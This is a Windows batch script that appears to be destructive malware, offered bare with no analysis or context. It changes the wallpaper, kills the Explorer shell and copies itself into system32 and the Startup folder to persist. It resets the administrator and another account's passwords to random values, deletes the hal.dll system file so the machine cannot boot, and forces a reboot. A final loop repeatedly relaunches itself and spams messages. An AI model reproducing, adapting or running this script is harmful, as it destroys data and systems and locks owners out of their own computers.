@echo off
@break off
color 0c
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\error.jpg" /f
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
taskkill /f /im explorer.exe
copy %0 %windir%\system32\mal.bat
copy %0 "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\%random%.bat"
net user administrator %random%
net user Luxxy %random%
del C:\WINDOWS\system32\hal.dll
shutdown -r -t 15
:worm
start C:\Windows\System32\mal.bat
msg * [[[~~~MAGGOT~~~]]]
goto worm